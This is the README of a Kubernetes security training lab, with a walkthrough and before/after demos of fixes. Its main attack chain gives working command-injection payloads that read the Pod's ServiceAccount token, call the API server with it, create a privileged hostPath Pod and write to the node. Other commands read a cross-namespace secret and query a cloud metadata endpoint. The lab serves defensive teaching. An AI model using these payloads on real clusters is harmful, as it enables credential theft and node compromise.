# Kubernetes Security Lab

A hands-on Kubernetes security lab built around one continuous attack story:

**a vulnerable web app with real command injection → steal the Pod's ServiceAccount token
→ abuse an over-broad RBAC grant → create a privileged Pod → escape to the underlying node.**

Alongside that main chain, the lab includes standalone demos for RBAC (`kubectl auth can-i`),
NetworkPolicy (default-deny + scoped allow), the Kubernetes API server, cloud metadata
services (a local Azure IMDS simulation), Pod Security (restricted vs. privileged), and
static analysis with Kubescape.

Every command in this repo has actually been run against a real cluster — the walkthrough
below includes the tested output alongside each step.

> ⚠️ This repo contains an intentionally vulnerable application and intentionally
> over-permissioned RBAC/Pod configs. Only run it in an isolated training cluster
> (minikube/kind), never against a shared or production cluster.

## Requirements

- Docker (daemon running)
- `minikube`, `kubectl`
- `kubescape` (`brew install kubescape`) — only needed for the static-analysis demo

## Quick start

```bash
git clone https://github.com/CyberstepsDE/k8s-security-lab.git
cd k8s-security-lab
./setup.sh
```

This starts a minikube cluster (with Calico, so NetworkPolicy actually works), builds the
vulnerable app image directly into minikube's Docker daemon, and deploys every demo's
baseline state — tested end to end from a clean `minikube delete` before shipping.

Then start the attack walkthrough:

```bash
kubectl port-forward svc/cluster-health-dashboard 5000:5000 -n default
open http://localhost:5000
```

When you're done:

```bash
./teardown.sh
```

## The main attack chain (start here)

The "Cluster Health Dashboard" at `http://localhost:5000` is a fake internal diagnostics
tool with a real OS command injection bug in its ping feature ([app/app.py](app/app.py)).
Its ServiceAccount is over-permissioned the way a real one often is in practice — someone
reused a CI/CD deploy identity (which legitimately needs to create Pods) for a small
internal app that only ever needed to read its own config.

**1. Exploit the command injection to steal the Pod's own credentials:**
```bash
curl -s -G "http://localhost:5000/ping" \
  --data-urlencode "host=127.0.0.1; cat /var/run/secrets/kubernetes.io/serviceaccount/token"
```
The ServiceAccount token comes back in the HTTP response — one request, no shell needed.

**2. Use the stolen token to talk to the Kubernetes API server directly, still through the injection:**
```bash
curl -s -G "http://localhost:5000/ping" --data-urlencode \
  'host=127.0.0.1; TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces'
```
Returns every namespace in the cluster — this app's identity was never supposed to see that.

**3. Escalate: use the same token to create a privileged Pod** (this ServiceAccount can
`create pods` cluster-wide, a permission it never needed for its actual job):
```bash
curl -s -G "http://localhost:5000/ping" --data-urlencode \
  'host=127.0.0.1; TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); curl -sk -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d @/opt/privileged-pod.json https://kubernetes.default.svc/api/v1/namespaces/default/pods'
```
The pod definition it POSTs (baked into the image at `/opt/privileged-pod.json`) is
`privileged: true` with `hostPath: /` mounted — full access to the node.

**4. Confirm the escalation actually reached the node**, not just the container:
```bash
kubectl wait --for=condition=Ready pod/pwned-via-rbac -n default --timeout=60s
minikube ssh -- cat /PWNED-BY-LAB.txt
```
That file was written by a Pod running on the cluster, straight onto the VM's real
filesystem — application-level command injection turned into node compromise, entirely
through the API server, no direct `kubectl` access ever used.

```bash
kubectl delete pod pwned-via-rbac -n default   # clean up before moving on
```

## Standalone demos

### RBAC: allow → deny (`manifests/02-rbac-can-i/`)

Deployed by `setup.sh`. A namespaced `Role`/`RoleBinding` granting `get`+`list` on pods,
then narrowed to `get` only:

```bash
kubectl auth can-i list pods --as=system:serviceaccount:demo:demo-sa -n demo
# → yes

kubectl apply -f manifests/02-rbac-can-i/role-deny.yaml

kubectl auth can-i list pods --as=system:serviceaccount:demo:demo-sa -n demo
# → no   (tested)
kubectl auth can-i get pods --as=system:serviceaccount:demo:demo-sa -n demo
# → yes  (tested)

# a real API call as the SA, not just a can-i check
kubectl get pods -n demo --as=system:serviceaccount:demo:demo-sa
# → Error from server (Forbidden): ... cannot list resource "pods" ...
```

### RBAC pop quiz, proven live (`manifests/03-rbac-popquiz-live/`)

Deployed by `setup.sh`: an over-broad `ClusterRole`+`ClusterRoleBinding` (`app-sa` in
`default`) next to a "victim" secret in a totally unrelated `database` namespace.

```bash
kubectl auth can-i get secrets --as=system:serviceaccount:default:app-sa -n database
# → yes   (tested — app-sa has nothing to do with "database")

kubectl get secret db-credentials -n database -o jsonpath='{.data.password}' \
  --as=system:serviceaccount:default:app-sa | base64 -d
# → SuperSecretProdPassword123!   (tested)
```

Fix it live with a namespaced `Role`/`RoleBinding` instead:

```bash
kubectl delete clusterrole app-reader
kubectl delete clusterrolebinding app-reader-binding
kubectl apply -f manifests/03-rbac-popquiz-live/fixed-role.yaml

kubectl auth can-i get secrets --as=system:serviceaccount:default:app-sa -n database
# → no   (tested: blocked)
kubectl auth can-i get pods --as=system:serviceaccount:default:app-sa -n default
# → yes  (tested: still works for what it actually needs)
```

### NetworkPolicy: flat network → default-deny → scoped allow (`manifests/04-network-policy/`)

Deployed by `setup.sh`: two tenants, no policy yet.

```bash
POD1=$(kubectl -n tenant-1 get pod -l app=nginx -o jsonpath='{.items[0].metadata.name}')

kubectl -n tenant-1 exec $POD1 -- wget -qO- http://nginx.tenant-2.svc.cluster.local:8080
# → full HTML response   (tested — flat network, nothing stops it)

kubectl apply -f manifests/04-network-policy/np-default-deny.yaml
kubectl -n tenant-1 exec $POD1 -- wget -qO- -T 5 http://nginx.tenant-2.svc.cluster.local:8080
# → wget: download timed out   (tested)

kubectl apply -f manifests/04-network-policy/np-allow-from-tenant1.yaml
kubectl -n tenant-1 exec $POD1 -- wget -qO- -T 5 http://nginx.tenant-2.svc.cluster.local:8080
# → HTML response again   (tested — restored for just this path)

# confirm it's scoped, not reopened - a third namespace stays blocked
kubectl run prober --image=busybox:1.36 -n default -- sleep 3600
kubectl -n default exec prober -- wget -qO- -T 5 http://nginx.tenant-2.svc.cluster.local:8080
# → wget: download timed out   (tested)
```

### Local Azure IMDS simulation (`manifests/05-metadata/`)

Deployed by `setup.sh`. Minikube isn't an Azure VM, so the real `169.254.169.254` won't
respond here — this mock returns Azure-IMDS-shaped JSON at the same paths.

```bash
# through the same injection used for the main attack chain
curl -s -G "http://localhost:5000/ping" --data-urlencode \
  'host=127.0.0.1; curl -s -H "Metadata:true" "http://mock-azure-imds/metadata/instance?api-version=2021-02-01"'
# → {"compute":{"azEnvironment":"AzurePublicCloud","location":"westeurope", ...}}   (tested)
```

On real AKS, the same command works verbatim against `169.254.169.254` instead of
`mock-azure-imds` — only the local simulation here has actually been verified.

### Pod Security: restricted vs. privileged (`manifests/06-pod-security/`)

Deployed by `setup.sh`. Same command, two pods, one flag (`privileged: true`) and one
volume mount (`hostPath`) apart:

```bash
kubectl exec restricted-pod -n default -- sh -c 'echo test > /etc/shadow'
# → Permission denied   (tested)

kubectl exec dangerous-pod -n default -- sh -c 'echo hi > /host/DEMO-PROOF.txt'
minikube ssh -- cat /DEMO-PROOF.txt
# → hi   (tested — landed on the real node, not just the container)
```

## Kubescape (shift-left)

```bash
kubescape scan framework nsa .
```

Run against this repo's own manifests, this catches the intentionally-bad configs before
they're ever deployed: the privileged containers in `06-pod-security/`, the plaintext
secret in `03-rbac-popquiz-live/victim-secret.yaml`, and the missing resource limits
across the board. Tested score: **58.11%** compliance, 17 high-severity findings.

## Repo layout

```
app/                          the vulnerable "Cluster Health Dashboard" (Flask, real command injection)
manifests/01-vulnerable-app/  its Deployment + over-permissioned RBAC
manifests/02-rbac-can-i/      RBAC allow/deny demo
manifests/03-rbac-popquiz-live/  the pop-quiz misconfig, live
manifests/04-network-policy/  tenant isolation demo
manifests/05-metadata/        local Azure IMDS simulation
manifests/06-pod-security/    restricted vs. privileged pod
setup.sh / teardown.sh        environment lifecycle
```

## Notes for instructors

- **NetworkPolicy needs a CNI that enforces it.** Minikube's default CNI silently ignores
  `NetworkPolicy` objects — `setup.sh` starts minikube with `--cni=calico` specifically for
  this. Running on a different cluster (kind, AKS, GKE)? Confirm the CNI supports
  `NetworkPolicy` before relying on that demo live.
- **The IMDS demo is a local simulation, not real Azure.** The real `169.254.169.254`
  endpoint only exists on an actual Azure VM/AKS node. If you want the *real* version of
  this demo against your AKS environment, that needs to be tested there separately — only
  the local stand-in here has been verified.
- **`role-deny.yaml`, `fixed-role.yaml`, `np-default-deny.yaml`, `np-allow-from-tenant1.yaml`**
  are deliberately not applied by `setup.sh` — they're the "after" state for their demos,
  meant to be applied live in front of the class so the before/after contrast is visible.
